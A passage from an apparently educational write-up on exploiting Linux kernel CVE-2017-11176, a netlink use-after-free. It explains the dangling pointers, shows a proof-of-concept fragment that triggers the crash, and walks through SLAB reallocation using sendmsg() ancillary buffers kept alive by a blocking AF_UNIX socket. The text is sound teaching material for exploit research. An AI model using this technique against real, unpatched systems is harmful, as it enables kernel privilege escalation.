class="nc">socket</span><span class="w"> </span><span class="o">*</span><span class="n">sock</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">sk</span><span class="p">;</span><span class="w">         </span><span class="c1">// &lt;----- dangling pointer</span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">netlink_sock</span><span class="w"> </span><span class="o">*</span><span class="n">nlk</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">sk</span><span class="p">)</span><span class="w">                            </span><span class="c1">// &lt;----- not NULL because... dangling pointer</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="n">netlink_remove</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span><span class="w">                 </span><span class="c1">// &lt;----- UAF</span>
<span class="w">    </span><span class="n">sock_orphan</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span><span class="w">                    </span><span class="c1">// &lt;----- UAF</span>
<span class="w">    </span><span class="n">nlk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nlk_sk</span><span class="p">(</span><span class="n">sk</span><span class="p">);</span><span class="w">                   </span><span class="c1">// &lt;----- UAF</span>

<span class="w">  </span><span class="c1">// ... cut (more and more UAF) ...</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Wow... that's a lot of <em>UAF primitives</em>, right? It is actually <em>too much</em> :-(... The problem is, that for every primitive it must:</p><ul><li>Do something useful or a <em>no-op</em></li><li>Do not crash (due to BUG_ON()) or bad deref</li></ul><p><strong>Because of this, <em>netlink_release()</em> is NOT a good candidate for exploitation (see next section).</strong></p><p>Before going further, let's validate that this was the root cause of the crash by modifying the PoC this way and run it:</p><div class="highlight"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">  </span><span class="c1">// ... cut ...</span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[ ] ready to crash?</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">PRESS_KEY</span><span class="p">();</span><span class="w"></span>

<span class="w">  </span><span class="n">close</span><span class="p">(</span><span class="n">unblock_fd</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"[ ] are we still alive ?</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">PRESS_KEY</span><span class="p">();</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>Nice, we don't see the <em>"[ ] are we still alive?"</em> message. Our intuition was correct, the kernel crashes because of <em>netlink_release()</em> UAFs. This also means another important thing:</p><p><strong>We have a way to trigger the <em>use-after-free</em> whenever we want!</strong></p><p>Now that we have identified the dangling pointers, understood why the kernel crash and thus, understood that we can trigger the UAF whenever we want, it is actually time to (finally) exploit it!</p><hr><h1 id="exploit-reallocation">Exploit (Reallocation)</h1><p><em>"This is not a drill!"</em></p><p>Independently of the bug, a <em>use-after-free</em> exploitation (w/ type confusion) needs a reallocation at some point. In order to do it, a <strong>reallocation gadget</strong> is necessary.</p><p>A reallocation gadget is a mean to force the kernel to call kmalloc() (i.e. a kernel code path) from userland (generally from a syscall). The <em>ideal</em> reallocation gadget has the following properties:</p><ul><li><strong>fast</strong>: no complex path before reaching <em>kmalloc()</em></li><li><strong>data control</strong>: fills the data allocated by <em>kmalloc()</em> with arbitrary content</li><li><strong>no block</strong>: the gadget does not block the thread</li><li><strong>flexible</strong>: the size argument of <em>kmalloc()</em> is controllable</li></ul><p>Unfortunately, it is pretty rare to find a single gadget that can do all of this. A <em>well-known</em> gadget is <strong>msgsnd()</strong> (System V IPC). It is fast, it does not block, you hit any <em>general purpose kmem_cache</em> starting with size 64. Alas, it can't control the first 48 bytes of data (<em>sizeof(struct msg_msg)</em>). We will not use it here, if you are curious about this gadget, look at <em>sysv_msg_load()</em>.</p><p>This section will introduce another <em>well-known</em> gadget: <strong>ancillary data buffer</strong> (also called <em>sendmsg()</em>). Then it will expose the main issue that can make your exploit fail and how to minimize the risk. To conclude this section, we will see how to implement the reallocation from userland.</p><hr><h2 id="reallocation-introduction-slab">Reallocation Introduction (SLAB)</h2><p>In order to exploit <em>use-after-free</em> with <strong>type confusion</strong>, we need to allocate a controlled object <strong>in place</strong> of the old <em>struct netlink_sock</em>. Let's consider that this object was located at: 0xffffffc0aabbcced. <strong>We can't change this location!</strong></p><p>"<em>If you can't come to them, let them come to you"</em>.</p><p><strong>The operation that consists in allocating an object at a very specific memory location is called reallocation. Typically, this memory location is the same than the object that has just been freed (e.g. <em>struct netlink_sock</em> in our case).</strong></p><p>With the SLAB allocator, this is pretty easy. Why? With the help of <em>struct array_cache</em>, the SLAB uses a <strong>LIFO algorithm</strong>. That is, the last free'd memory location of a given size (kmalloc-1024) will be the first one re-used for an allocation of the same size (cf. Core Concept #3). It is even more <em>awesome</em> since it is <strong>independent of the slab</strong>. You will miss this property while trying to reallocate with the SLUB.</p><p>Let's describe the <em>kmalloc-1024</em> cache:</p><ul><li>Each object in the kmalloc-1024 kmem_cache has a size of 1024</li><li>Each slab is composed of a single page (4096 bytes), hence there are 4 objects per slab</li><li>Let's assume the cache has two slabs for now</li></ul><p>Before freeing the <em>struct netlink_sock</em> object, we are in this situation:</p><p></p><figure><img src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 3_files/realloc_0.png" title="Reallocation before free"><figcaption class="figcaption figure-caption text-center">realloc_before_free</figcaption></figure><p></p><p>Note that the <strong>ac-&gt;available</strong> is the index (plus one) of the next free object. Then the <em>netlink_sock</em> object is free. In the <em>fastest path</em>, freeing an object (<em>kfree(objp)</em>) is equivalent to:</p><div class="highlight"><pre><span></span><code><span class="n">ac</span><span class="o">-&gt;</span><span class="n">entry</span><span class="p">[</span><span class="n">ac</span><span class="o">-&gt;</span><span class="n">avail</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">objp</span><span class="p">;</span><span class="w">  </span><span class="c1">// "ac-&gt;avail" is POST-incremented</span>
</code></pre></div><p>It leads to this situation:</p><p></p><figure><img src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 3_files/realloc_1.png" title="Reallocation after free"><figcaption class="figcaption figure-caption text-center">realloc_after_free</figcaption></figure><p></p><p>Finally, a <em>struct sock</em> object is allocated (<em>kmalloc(1024)</em>) with (<em>fastest path</em>):</p><div class="highlight"><pre><span></span><code><span class="n">objp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ac</span><span class="o">-&gt;</span><span class="n">entry</span><span class="p">[</span><span class="o">--</span><span class="n">ac</span><span class="o">-&gt;</span><span class="n">avail</span><span class="p">];</span><span class="w">  </span><span class="c1">// "ac-&gt;avail" is PRE-decremented</span>
</code></pre></div><p>Which leads to:</p><p></p><figure><img src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 3_files/realloc_2.png" title="Reallocation realloc"><figcaption class="figcaption figure-caption text-center">realloc_realloc</figcaption></figure><p></p><p>That's it! <strong>The memory location of the new <em>struct sock</em> is the same than the (old) memory location of the <em>struct netlink_sock</em></strong> (e.g. 0xffffffc0aabbccdd). We did a <em>retake</em> or "re-allocation". Not too bad, right?</p><p>Well, <strong>this is the ideal case</strong>. In practice, multiple things can go wrong as we will see later.</p><hr><h2 id="reallocation-gadget">Reallocation Gadget</h2><p>The previous articles covered two socket buffers: the sending buffer and the receiver buffer. There is actually a third one: <strong>option buffer</strong> (also called "ancillary data buffer"). In this section, we will see how to fill it with arbitrary data and use it as our reallocation gadget.</p><p>This gadget is accessible from the "upper" part of the <em>sendmsg()</em> syscall. Function <strong>__sys_sendmsg()</strong> is (almost) directly called by <em>SYSCALL_DEFINE3(sendmsg)</em>:</p><div class="highlight"><pre><span></span><code><span class="w">      </span><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">__sys_sendmsg</span><span class="p">(</span><span class="k">struct</span> <span class="nc">socket</span><span class="w"> </span><span class="o">*</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span> <span class="nc">msghdr</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="n">msg</span><span class="p">,</span><span class="w"></span>
<span class="w">             </span><span class="k">struct</span> <span class="nc">msghdr</span><span class="w"> </span><span class="o">*</span><span class="n">msg_sys</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="n">flags</span><span class="p">,</span><span class="w"></span>
<span class="w">             </span><span class="k">struct</span> <span class="nc">used_address</span><span class="w"> </span><span class="o">*</span><span class="n">used_address</span><span class="p">)</span><span class="w"></span>
<span class="w">      </span><span class="p">{</span><span class="w"></span>
<span class="w">        </span><span class="k">struct</span> <span class="nc">compat_msghdr</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="n">msg_compat</span><span class="w"> </span><span class="o">=</span><span class="w"></span>
<span class="w">            </span><span class="p">(</span><span class="k">struct</span> <span class="nc">compat_msghdr</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">msg</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="k">struct</span> <span class="nc">sockaddr_storage</span><span class="w"> </span><span class="n">address</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="k">struct</span> <span class="nc">iovec</span><span class="w"> </span><span class="n">iovstack</span><span class="p">[</span><span class="n">UIO_FASTIOV</span><span class="p">],</span><span class="w"> </span><span class="o">*</span><span class="n">iov</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">iovstack</span><span class="p">;</span><span class="w"></span>
<span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">     </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">ctl</span><span class="p">[</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="nc">cmsghdr</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">20</span><span class="p">]</span><span class="w"></span>
<span class="w">            </span><span class="n">__attribute__</span><span class="w"> </span><span class="p">((</span><span class="n">aligned</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">__kernel_size_t</span><span class="p">))));</span><span class="w"></span>
<span class="w">        </span><span class="cm">/* 20 is size of ipv6_pktinfo */</span><span class="w"></span>
<span class="w">        </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">ctl_buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ctl</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">err</span><span class="p">,</span><span class="w"> </span><span class="n">ctl_len</span><span class="p">,</span><span class="w"> </span><span class="n">iov_size</span><span class="p">,</span><span class="w"> </span><span class="n">total_len</span><span class="p">;</span><span class="w"></span>

<span class="w">        </span><span class="c1">// ... cut (copy msghdr/iovecs + sanity checks) ...</span>

<span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w">     </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">msg_sys</span><span class="o">-&gt;</span><span class="n">msg_controllen</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">INT_MAX</span><span class="p">)</span><span class="w"></span>
<span class="w">          </span><span class="k">goto</span><span class="w"> </span><span class="n">out_freeiov</span><span class="p">;</span><span class="w"></span>
<span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w">     </span><span class="n">ctl_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">msg_sys</span><span class="o">-&gt;</span><span class="n">msg_controllen</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">MSG_CMSG_COMPAT</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">flags</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">ctl_len</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">          </span><span class="c1">// ... cut ...</span>
<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">ctl_len</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">          </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">ctl_len</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">ctl</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="w">         </span><span class="n">ctl_buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sock_kmalloc</span><span class="p">(</span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">sk</span><span class="p">,</span><span class="w"> </span><span class="n">ctl_len</span><span class="p">,</span><span class="w"> </span><span class="n">GFP_KERNEL</span><span class="p">);</span><span class="w"></span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">ctl_buf</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"></span>
<span class="w">              </span><span class="k">goto</span><span class="w"> </span><span class="n">out_freeiov</span><span class="p">;</span><span class="w"></span>
<span class="w">          </span><span class="p">}</span><span class="w"></span>
<span class="w">          </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span><span class="w"></span>

<span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="w">       </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">copy_from_user</span><span class="p">(</span><span class="n">ctl_buf</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">msg_sys</span><span class="o">-&gt;</span><span class="n">msg_control</span><span class="p">,</span><span class="w"></span>
<span class="w">                 </span><span class="n">ctl_len</span><span class="p">))</span><span class="w"></span>
<span class="w">            </span><span class="k">goto</span><span class="w"> </span><span class="n">out_freectl</span><span class="p">;</span><span class="w"></span>
<span class="w">          </span><span class="n">msg_sys</span><span class="o">-&gt;</span><span class="n">msg_control</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ctl_buf</span><span class="p">;</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>

<span class="w">        </span><span class="c1">// ... cut ...</span>

<span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="w">     </span><span class="n">err</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sock_sendmsg</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="n">msg_sys</span><span class="p">,</span><span class="w"> </span><span class="n">total_len</span><span class="p">);</span><span class="w"></span>

<span class="w">        </span><span class="c1">// ... cut ...</span>

<span class="w">      </span><span class="nl">out_freectl</span><span class="p">:</span><span class="w"></span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">ctl_buf</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">ctl</span><span class="p">)</span><span class="w"></span>
<span class="p">[</span><span class="mi">6</span><span class="p">]</span><span class="w">       </span><span class="n">sock_kfree_s</span><span class="p">(</span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">sk</span><span class="p">,</span><span class="w"> </span><span class="n">ctl_buf</span><span class="p">,</span><span class="w"> </span><span class="n">ctl_len</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="nl">out_freeiov</span><span class="p">:</span><span class="w"></span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">iov</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">iovstack</span><span class="p">)</span><span class="w"></span>
<span class="w">          </span><span class="n">sock_kfree_s</span><span class="p">(</span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">sk</span><span class="p">,</span><span class="w"> </span><span class="n">iov</span><span class="p">,</span><span class="w"> </span><span class="n">iov_size</span><span class="p">);</span><span class="w"></span>
<span class="w">      </span><span class="nl">out</span><span class="p">:</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">err</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>It does:</p><ul><li>[0] - declare a <em>ctl</em> buffer of 36 bytes (16 + 20) on the stack</li><li>[1] - validate that the <em>user-provided msg_controllen</em> is smaller than or equal to <em>INT_MAX</em></li><li>[2] - copy the <em>user-provided msg_controllen</em> to <em>ctl_len</em></li><li>[3] - <strong>allocate a kernel buffer <em>ctl_buf</em> of size <em>ctl_len</em> with <em>kmalloc()</em></strong></li><li>[4] - <strong>copy <em>ctl_len</em> bytes of <em>user-provided data</em> from <em>msg_control</em> to kernel buffer <em>ctl_buf</em> allocated at [3]</strong></li><li>[5] - call <em>sock_sendmsg()</em> which will call a socket's callback <em>sock-&gt;ops-&gt;sendmsg()</em></li><li>[6] - free the kernel buffer <em>ctl_buf</em></li></ul><p>Lots of <em>user-provided</em> stuff, isn't it? Yup, that's why we like it! To summarize, we can allocate a kernel buffer with <em>kmalloc()</em> with:</p><ul><li><strong>msg-&gt;msg_controllen</strong>: arbitrary size (must be greater than 36 but lesser than <em>INT_MAX</em>)</li><li><strong>msg-&gt;msg_control</strong>: arbitrary content</li></ul><p>Now, let's see what <strong>sock_kmalloc()</strong> does:</p><div class="highlight"><pre><span></span><code><span class="w">      </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="nf">sock_kmalloc</span><span class="p">(</span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">size</span><span class="p">,</span><span class="w"> </span><span class="n">gfp_t</span><span class="w"> </span><span class="n">priority</span><span class="p">)</span><span class="w"></span>
<span class="w">      </span><span class="p">{</span><span class="w"></span>
<span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">     </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="kt">unsigned</span><span class="p">)</span><span class="n">size</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">sysctl_optmem_max</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"></span>
<span class="w">            </span><span class="n">atomic_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_omem_alloc</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">size</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">sysctl_optmem_max</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">          </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">mem</span><span class="p">;</span><span class="w"></span>
<span class="w">          </span><span class="cm">/* First do the add, to avoid the race if kmalloc</span>
<span class="cm">           * might sleep.</span>
<span class="cm">           */</span><span class="w"></span>
<span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w">       </span><span class="n">atomic_add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_omem_alloc</span><span class="p">);</span><span class="w"></span>
<span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w">       </span><span class="n">mem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">kmalloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="w"> </span><span class="n">priority</span><span class="p">);</span><span class="w"></span>
<span class="w">          </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">mem</span><span class="p">)</span><span class="w"></span>
<span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="w">         </span><span class="k">return</span><span class="w"> </span><span class="n">mem</span><span class="p">;</span><span class="w"></span>
<span class="w">          </span><span class="n">atomic_sub</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_omem_alloc</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="p">}</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<span class="w">      </span><span class="p">}</span><span class="w"></span>
</code></pre></div><p>First, the <em>size</em> argument is checked against the <strong>kernel parameter "optmem_max"</strong> [0]. It can be retrieved with the procfs:</p><div class="highlight"><pre><span></span><code>$ cat /proc/sys/net/core/optmem_max
</code></pre></div><p>If the provided size is smaller than that, then the size is added to the <em>current</em> option memory buffer size and check that it is smaller than "optmem_max" [0]. We will need to check this in the exploit. Remember, our target <em>kmem_cache</em> is <strong>kmalloc-1024</strong>. If the "optmem_max" size is smaller than or equal to 512, then we are screwed! In that case, we should find another reallocation gadget. The <strong>sk_omem_alloc</strong> is initialized at zero during sock creation.</p><p><strong>NOTE</strong>: Remember that <em>kmalloc(512 + 1)</em> will land in the <em>kmalloc-1024</em> cache.</p><p>If the check [0] is passed, then the <em>sk_omem_alloc</em> value is increased by <em>size</em> [1]. Then, there is a call to <strong>kmalloc()</strong> using the <em>size</em> argument. If it succeeds, the pointer is returned [3], otherwise <em>sk_omem_alloc</em> is reduced by <em>size</em> and the function returns <em>NULL</em>.</p><p>Alright, we can call <em>kmalloc()</em> with an almost arbitrary size ([36, sysctl_optmem_max[) and its content will be filled with arbitrary value. There is a problem though. The <em>ctl_buf</em> buffer will be automatically freed when <em>__sys_sendmsg()</em> exits ([6] in previous listing). That is, <strong>the call [5] <em>sock_sendmsg()</em> must block</strong> (i.e. <em>sock-&gt;ops-&gt;sendmsg()</em>).</p><h2 id="blocking-sendmsg">Blocking sendmsg()</h2><p>In the previous article, we saw how to make a <em>sendmsg()</em> call block: <strong>fill the receive buffer</strong>. One might be tempted to do the same thing with <em>netlink_sendmsg()</em>. Unfortunately, we can't re-use it there. The reason is <em>netlink_sendmsg()</em> will call <em>netlink_unicast()</em> which calls <strong>netlink_getsockbypid()</strong>. Doing so, will <strong>deref the nl_table's hash list <em>dangling pointer</em></strong> (i.e. <em>use-after-free</em>).</p><p>That is, we must use another socket family: <strong>AF_UNIX</strong>. You can probably use another one but this one is nice since it is guaranteed to be present almost everywhere and does not require specific privileges.</p><p><strong>WARNING</strong>: We will not describe the AF_UNIX implementation (especially <em>unix_dgram_sendmsg()</em>), that would be too long. It is not that complex (lots of similarities from AF_NETLINK) and we only want two things:</p><ul><li>allocate arbitrary data in the "option" buffer (cf. last section)</li><li>make the call to <em>unix_dgram_sendmsg()</em> blocking</li></ul><p>Like <em>netlink_unicast()</em>, a <em>sendmsg()</em> can be blocking if:</p><ol><li>The destination receive buffer is full</li><li>The sender socket's timeout value is set to <em>MAX_SCHEDULE_TIMEOUT</em></li></ol><p>In <em>unix_dgram_sendmsg()</em> (like <em>netlink_unicast()</em>), this <em>timeo</em> value is computed with:</p><div class="highlight"><pre><span></span><code><span class="n">timeo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sock_sndtimeo</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span><span class="w"> </span><span class="n">msg</span><span class="o">-&gt;</span><span class="n">msg_flags</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">MSG_DONTWAIT</span><span class="p">);</span><span class="w"></span>
</code></pre></div><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kr">inline</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="nf">sock_sndtimeo</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">noblock</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">noblock</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_sndtimeo</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>That is, if we do not set the <em>noblock</em> argument (i.e. don't use MSG_DONTWAIT), the timeout value is <strong>sk_sndtimeo</strong>. Fortunately, this value can be controlled <em>via</em> <strong>setsockopt()</strong>:</p><div class="highlight"><pre><span></span><code><span class="kt">int</span><span class="w"> </span><span class="nf">sock_setsockopt</span><span class="p">(</span><span class="k">struct</span> <span class="nc">socket</span><span class="w"> </span><span class="o">*</span><span class="n">sock</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">level</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">optname</span><span class="p">,</span><span class="w"></span>
<span class="w">            </span><span class="kt">char</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="n">optval</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">optlen</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">sock</span><span class="w"> </span><span class="o">*</span><span class="n">sk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sock</span><span class="o">-&gt;</span><span class="n">sk</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="c1">// ... cut ...</span>

<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="nl">SO_SNDTIMEO</span><span class="p">:</span><span class="w"></span>
<span class="w">        </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sock_set_timeout</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_sndtimeo</span><span class="p">,</span><span class="w"> </span><span class="n">optval</span><span class="p">,</span><span class="w"> </span><span class="n">optlen</span><span class="p">);</span><span class="w"></span>
<span class="w">        </span><span class="k">break</span><span class="p">;</span><span class="w"></span>

<span class="w">  </span><span class="c1">// ... cut ...</span>
<span class="p">}</span><span class="w"></span>
</code></pre></div><p>It calls <strong>sock_set_timeout()</strong>:</p><div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">sock_set_timeout</span><span class="p">(</span><span class="kt">long</span><span class="w"> </span><span class="o">*</span><span class="n">timeo_p</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="n">optval</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">optlen</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">timeval</span><span class="w"> </span><span class="n">tv</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">optlen</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">tv</span><span class="p">))</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tv</span><span class="p">,</span><span class="w"> </span><span class="n">optval</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">tv</span><span class="p">)))</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">tv</span><span class="p">.</span><span class="n">tv_usec</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">tv</span><span class="p">.</span><span class="n">tv_usec</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">USEC_PER_SEC</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="o">-</span><span class="n">EDOM</span><span class="p">;</span><span class="w"></span>

